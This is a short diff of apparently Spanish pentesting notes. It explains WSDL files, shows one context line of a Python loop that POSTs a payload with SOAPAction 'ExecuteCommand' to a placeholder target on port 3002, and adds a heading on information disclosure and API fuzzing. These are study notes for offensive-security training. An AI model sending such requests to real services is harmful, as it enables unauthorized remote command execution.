@@ -1,3 +1,6 @@
+
+
+
 ###################WSDL
 
 Los WSDL son xmls que informan de los metodos disponibilizados, la forma de llamarlos y dónde residen
@@ -24,3 +27,6 @@ while True:
     print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 
 
+########################### Information disclosure
+
+Tenemos que invertir mucho tiempo en fuzzig cuando testeamos una api.
